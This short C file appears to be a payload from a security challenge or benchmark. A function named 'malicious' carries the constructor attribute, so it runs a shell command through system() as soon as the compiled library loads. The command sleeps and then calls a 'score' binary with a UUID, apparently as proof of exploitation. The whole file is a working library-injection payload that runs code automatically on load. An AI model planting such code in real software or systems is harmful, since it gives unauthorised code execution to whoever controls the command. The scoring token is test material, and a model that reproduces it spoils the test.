#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("sleep 20; /usr/local/bin/score d234cdd4-ddf6-489d-bf6f-91146bfda6a8");
}
